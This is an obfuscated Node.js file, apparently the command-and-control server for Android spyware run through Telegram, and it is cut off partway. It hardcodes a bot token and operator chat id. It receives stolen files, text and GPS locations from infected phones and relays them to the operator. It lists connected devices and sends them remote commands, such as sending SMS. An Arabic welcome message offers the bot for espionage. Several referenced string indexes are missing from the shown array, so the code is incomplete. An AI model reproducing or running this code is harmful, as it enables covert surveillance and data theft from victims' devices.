var _0x52ef = ["\x65\x78\x70\x72\x65\x73\x73", "\x77\x73", "\x68\x74\x74\x70", "\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69", "\x75\x75\x69\x64", "\x6D\x75\x6C\x74\x65\x72", "\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72", "\x61\x78\x69\x6F\x73"];
const express = require(_0x52ef[0]);
const webSocket = require(_0x52ef[1]);
const http = require(_0x52ef[2]);
const telegramBot = require(_0x52ef[3]);
const uuid4 = require(_0x52ef[4]);
const multer = require(_0x52ef[5]);
const bodyParser = require(_0x52ef[6]);
const axios = require(_0x52ef[7])

const token = '7164564004:AAHen1MDJoH-uVnLVr30C-FZpDSyEsjrx74'
const id = '385476702'
const address = 'https://www.google.com'

var _0xdc21 = ["\x63\x72\x65\x61\x74\x65\x53\x65\x72\x76\x65\x72", "\x6A\x73\x6F\x6E", "\x75\x73\x65", "", "\x2F", "\x3C\x68\x31\x20\x61\x6C\x69\x67\x6E\x3D\x22\x63\x65\x6E\x74\x65\x72\x22\x3E\u2714\uFE0F\x20\u062A\u0645 \u062A\u062D\u0645\u064A\u0644 \u0627\u0644\u062E\u0627\u062F\u0645 \u0628\u0646\u062C\u0627\u062D\x3C\x2F\x68\x31\x3E", "\x73\x65\x6E\x64", "\x67\x65\x74", "\x2F\x75\x70\x6C\x6F\x61\x64\x46\x69\x6C\x65", "\x66\x69\x6C\x65", "\x73\x69\x6E\x67\x6C\x65", "\x6F\x72\x69\x67\x69\x6E\x61\x6C\x6E\x61\x6D\x65", "\x62\x75\x66\x66\x65\x72", "\xB0\u2022\x20\u0631\u0633\u0627\u0644\u0629 \u0645\u0646\x20\x3C\x62\x3E", "\x6D\x6F\x64\x65\x6C", "\x68\x65\x61\x64\x65\x72\x73", "\x3C\x2F\x62\x3E\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A", "\x48\x54\x4D\x4C", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x74\x78\x74", "\x73\x65\x6E\x64\x44\x6F\x63\x75\x6D\x65\x6E\x74", "\x70\x6F\x73\x74", "\x2F\x75\x70\x6C\x6F\x61\x64\x54\x65\x78\x74", "\x3C\x2F\x62\x3E\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x5C\x6E\x5C\x6E", "\x74\x65\x78\x74", "\x62\x6F\x64\x79", "\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65", "\x2F\x75\x70\x6C\x6F\x61\x64\x4C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x61\x74", "\x6C\x6F\x6E", "\x73\x65\x6E\x64\x4C\x6F\x63\x61\x74\x69\x6F\x6E", "\xB0\u2022\x20\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x20\uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62\x20\x3C\x62\x3E", "\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E", "\x76\x34", "\x62\x61\x74\x74\x65\x72\x79", "\x76\x65\x72\x73\x69\x6F\x6E", "\x62\x72\x69\x67\x68\x74\x6E\x65\x73\x73", "\x70\x72\x6F\x76\x69\x64\x65\x72", "\x75\x75\x69\x64", "\x73\x65\x74", "\xB0\u2022\x20\u062C\u0647\u0627\u0632 \u062C\u062F\u064A\u062F \u0645\u062A\u0635\u0644 \uD83C\uDD95\x5C\x6E\x5C\x6E", "\u2022\x20\u1D05\u1D07\u1D20\u026A\u1D04\u1D07\x20\u1D0D\u1D0F\u1D05\u1D07\u029F\x20\x3A\x20\x3C\x62\x3E", "\x3C\x2F\x62\x3E\x5C\x6E", "\u2022\x20\u0299\u1D00\u1D1B\u1D1B\u1D07\u0280\u028F\x20\x3A\x20\x3C\x62\x3E", "\u2022\x20\u1D00\u0274\u1D05\u0280\u1D0F\u026A\u1D05\x20\u1D20\u1D07\u0280\uA731\u026A\u1D0F\u0274\x20\x3A\x20\x3C\x62\x3E", "\u2022\x20\uA731\u1D04\u0280\u1D07\u1D07\u0274\x20\u0299\u0280\u026A\u0262\u029C\u1D1B\u0274\u1D07\uA731\uA731\x20\x3A\x20\x3C\x62\x3E", "\u2022\x20\u1D18\u0280\u1D0F\u1D20\u026A\u1D05\u1D07\u0280\x20\x3A\x20\x3C\x62\x3E", "\x3C\x2F\x62\x3E", "\x63\x6C\x6F\x73\x65", "\xB0\u2022\x20\u062A\u0645 \u0641\u0635\u0644 \u0627\u0644\u062C\u0647\u0627\u0632 \uD83D\uDEAB\x5C\x6E\x5C\x6E", "\x64\x65\x6C\x65\x74\x65", "\x6F\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x69\x64", "\x63\x68\x61\x74", "\x72\x65\x70\x6C\x79\x5F\x74\x6F\x5F\x6D\x65\x73\x73\x61\x67\x65", "\xB0\u2022\x20\u064A\u0631\u062C\u0649 \u0627\u0644\u0631\u062F \u0639\u0644\u0649 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0627\u0644\u0642\u0635\u064A\u0631\u0629 \u0625\u0644\u064A\u0647", "\x69\x6E\x63\x6C\x75\x64\x65\x73", "\xB0\u2022\x20\u0631\u0627\u0626\u0639 \u0627\u0644\u0622\u0646 \u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645\x0A\x0A", "\u2022\x20\u0299\u1D07\x20\u1D04\u1D00\u0280\u1D07\uA730\u1D1C\u029F\x20\u1D1B\u029C\u1D00\u1D1B\x20\u1D1B\u029C\u1D07\x20\u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07\x20\u1D21\u026A\u029F\u029F\x20\u0274\u1D0F\u1D1B\x20\u0299\u1D07\x20\uA731\u1D07\u0274\u1D1B\x20\u026A\uA730\x20\u1D1B\u029C\u1D07\x20\u0274\u1D1C\u1D0D\u0299\u1D07\u0280\x20\u1D0F\uA730\x20\u1D04\u029C\u1D00\u0280\u1D00\u1D04\u1D1B\u1D07\u0280\uA731\x20\u026A\u0274\x20\u028F\u1D0F\u1D1C\u0280\x20\u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07\x20\u026A\uA731\x20\u1D0D\u1D0F\u0280\u1D07\x20\u1D1B\u029C\u1D00\u0274\x20"];

const bot = new telegramBot(token, { polling: true });

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const startCommand = "/start";

    if (msg.text.toString().toLowerCase().startsWith(startCommand)) {
        const newMessage = "• مرحبًا بكم في بوت فريقZR0، \n\n• وحدة الأمن الإلكتروني المتخصصة في الأمن السيبراني والتجسس الاستخباراتي. يُسعدنا تقديم بوت تليجرام لعملائنا للاستخدام في التجسس وفقًا للتوجيهات. يُرجى عدم استخدامه بشكل فردي ومن غير توجيهات فني او استعمال بدون خبره كافيه او درايه فنيه لاي جهات معنيه.\n\n• الدعم الفني https://t.me/zr0zz\n\n• اضغط هنا /start";
        bot.sendMessage(chatId, newMessage);
    } else {
        // معالجة الرسائل الأخرى هنا
    }
});const app = express();
const appServer = http[_0xdc21[0]](app);
const appSocket = new webSocket.Server({
   server: appServer
});
const appBot = new telegramBot(token, {
   polling: true
});
const appClients = new Map();
const upload = multer();
app[_0xdc21[2]](bodyParser[_0xdc21[1]]());
let currentUuid = _0xdc21[3];
let currentNumber = _0xdc21[3];
let currentTitle = _0xdc21[3];
app[_0xdc21[7]](_0xdc21[4], function (_0xeb57xa, _0xeb57xb) {
   _0xeb57xb[_0xdc21[6]](_0xdc21[5])
});
app[_0xdc21[20]](_0xdc21[8], upload[_0xdc21[10]](_0xdc21[9]), (_0xeb57xa, _0xeb57xb) => {
   const _0xeb57xc = _0xeb57xa[_0xdc21[9]][_0xdc21[11]];
   appBot[_0xdc21[19]](id, _0xeb57xa[_0xdc21[9]][_0xdc21[12]], {
      caption: `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`,
      parse_mode: _0xdc21[17]
   }, {
      filename: _0xeb57xc,
      contentType: _0xdc21[18]
   });
   _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[21], (_0xeb57xa, _0xeb57xb) => {
   appBot[_0xdc21[25]](id, `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[22]}` + _0xeb57xa[_0xdc21[24]][_0xdc21[23]], {
      parse_mode: _0xdc21[17]
   });
   _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[26], (_0xeb57xa, _0xeb57xb) => {
   appBot[_0xdc21[29]](id, _0xeb57xa[_0xdc21[24]][_0xdc21[27]], _0xeb57xa[_0xdc21[24]][_0xdc21[28]]);
   appBot[_0xdc21[25]](id, `${_0xdc21[30]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`, {
      parse_mode: _0xdc21[17]
   });
   _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
appSocket[_0xdc21[50]](_0xdc21[31], (_0xeb57xd, _0xeb57xa) => {
   const _0xeb57xe = uuid4[_0xdc21[32]]();
   const _0xeb57xf = _0xeb57xa[_0xdc21[15]][_0xdc21[14]];
   const _0xeb57x10 = _0xeb57xa[_0xdc21[15]][_0xdc21[33]];
   const _0xeb57x11 = _0xeb57xa[_0xdc21[15]][_0xdc21[34]];
   const _0xeb57x12 = _0xeb57xa[_0xdc21[15]][_0xdc21[35]];
   const _0xeb57x13 = _0xeb57xa[_0xdc21[15]][_0xdc21[36]];
   _0xeb57xd[_0xdc21[37]] = _0xeb57xe;
   appClients[_0xdc21[38]](_0xeb57xe, {
      model: _0xeb57xf,
      battery: _0xeb57x10,
      version: _0xeb57x11,
      brightness: _0xeb57x12,
      provider: _0xeb57x13
   });
   appBot[_0xdc21[25]](id, `${_0xdc21[39]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
      parse_mode: _0xdc21[17]
   });
   _0xeb57xd[_0xdc21[50]](_0xdc21[47], function () {
      appBot[_0xdc21[25]](id, `${_0xdc21[48]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
         parse_mode: _0xdc21[17]
      });
      appClients[_0xdc21[49]](_0xeb57xd[_0xdc21[37]])
   })
});
appBot[_0xdc21[50]](_0xdc21[51], (_0xeb57x14) => {
   const _0xeb57x15 = _0xeb57x14[_0xdc21[53]][_0xdc21[52]];
   if (_0xeb57x14[_0xdc21[54]]) {
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[55])) {
         currentNumber = _0xeb57x14[_0xdc21[23]];
         appBot[_0xdc21[25]](id, _0xdc21[57] + _0xdc21[58], {
            reply_markup: {
               force_reply: true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[59])) {
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[60]}${currentNumber}${_0xdc21[4]}${_0xeb57x14[_0xdc21[23]]}${_0xdc21[3]}`)
            }
         });
         currentNumber = _0xdc21[3];
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[67])) {
         const _0xeb57x17 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[68]}${_0xeb57x17}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[69])) {
         const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[70]}${_0xeb57x18}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[71])) {
         const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[72]}${_0xeb57x18}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[73])) {
         const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[74]}${_0xeb57x19}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[75])) {
         const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[76]}${_0xeb57x19}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[77])) {
         const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[78]}${_0xeb57x19}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[79])) {
         const _0xeb57x1a = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[80]}${_0xeb57x1a}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[81])) {
         const _0xeb57x1b = _0xeb57x14[_0xdc21[23]];
         currentTitle = _0xeb57x1b;
         appBot[_0xdc21[25]](id, _0xdc21[82] + _0xdc21[83], {
            reply_markup: {
               force_reply: true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[84])) {
         const _0xeb57x1c = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[85]}${currentTitle}${_0xdc21[4]}${_0xeb57x1c}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[86])) {
         const _0xeb57x1d = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[87]}${_0xeb57x1d}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      }
   };
   if (id == _0xeb57x15) {
      if (_0xeb57x14[_0xdc21[23]] == _0xdc21[88]) {
         appBot[_0xdc21[25]](id, _0xdc21[89] + _0xdc21[90] + _0xdc21[91] + _0xdc21[92] + _0xdc21[93], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[23]] == _0xdc21[65]) {
         if (appClients[_0xdc21[94]] == 0) {
            appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
         } else {
            let _0xeb57x1e = _0xdc21[97];
            appClients[_0xdc21[61]](function (_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
               _0xeb57x1e += `${_0xdc21[40]}${_0xeb57x1f[_0xdc21[14]]}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x1f[_0xdc21[33]]}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x1f[_0xdc21[34]]}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x1f[_0xdc21[35]]}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x1f[_0xdc21[36]]}${_0xdc21[98]}`
            });
            appBot[_0xdc21[25]](id, _0xeb57x1e, {
               parse_mode: _0xdc21[17]
            })
         }
      };
      if (_0xeb57x14[_0xdc21[23]] == _0xdc21[66]) {
         if (appClients[_0xdc21[94]] == 0) {
            appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
         } else {
            const _0xeb57x22 = [];
            appClients[_0xdc21[61]](function (_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
               _0xeb57x22[_0xdc21[100]]([{
                  text: _0xeb57x1f[_0xdc21[14]],
                  callback_data: _0xdc21[99] + _0xeb57x20
               }])
            });
            appBot[_0xdc21[25]](id, _0xdc21[101], {
               "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
                  "\x69\x6E\x6C\x69\x6E\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64": _0xeb57x22
               }
            })
         }
      }
   } else {
      appBot[_0xdc21[25]](id, _0xdc21[102])
   }
});
appBot[_0xdc21[50]](_0xdc21[103], (_0xeb57x23) => {
   const _0xeb57x24 = _0xeb57x23[_0xdc21[51]];
   const _0xeb57x25 = _0xeb57x23[_0xdc21[104]];
   const _0xeb57x26 = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[0];
   const _0xeb57xe = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[1];
   console[_0xdc21[107]](_0xeb57xe);
   if (_0xeb57x26 == _0xdc21[108]) {
      appBot[_0xdc21[141]](`${_0xdc21[109]}${appClients[_0xdc21[7]](_0xeb57x25[_0xdc21[106]](_0xdc21[105])[1])[_0xdc21[14]]}${_0xdc21[46]}`, {
         width: 10000,
         chat_id: id,
         message_id: _0xeb57x24[_0xdc21[110]],
         reply_markup: {
            inline_keyboard: [
               [{
                  text: _0xdc21[111],
                  callback_data: `${_0xdc21[112]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[113],
                  callback_data: `${_0xdc21[114]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[115],
                  callback_data: `${_0xdc21[70]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[116],
                  callback_data: `${_0xdc21[72]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[117],
                  callback_data: `${_0xdc21[118]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[119],
                  callback_data: `${_0xdc21[74]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[120],
                  callback_data: `${_0xdc21[121]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[122],
                  callback_data: `${_0xdc21[123]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[124],
                  callback_data: `${_0xdc21[125]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[126],
                  callback_data: `${_0xdc21[80]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[127],
                  callback_data: `${_0xdc21[128]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[129],
                  callback_data: `${_0xdc21[130]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[131],
                  callback_data: `${_0xdc21[132]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[133],
                  callback_data: `${_0xdc21[85]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[134],
                  callback_data: `${_0xdc21[135]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[136],
                  callback_data: `${_0xdc21[60]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[137],
                  callback_data: `${_0xdc21[87]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[138],
                  callback_data: `${_0xdc21[139]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[140],
                  callback_data: `${_0xdc21[68]}${_0xeb57xe}${_0xdc21[3]}`
               }]
            ]
         },
         parse_mode: _0xdc21[17]
      })
   };
   if (_0xeb57x26 == _0xdc21[142]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[142])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[144]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[144])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
   if (_0xeb57x26 == _0xdc21[145]) {
      appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
         if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
            _0xeb57xd[_0xdc21[6]](_0xdc21[145])
         }
      });
      appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
      appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
         parse_mode: _0xdc21[17],
         "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
            "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
               [_0xdc21[65]],
               [_0xdc21[66]]
            ],
            '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
         }
      })
   };
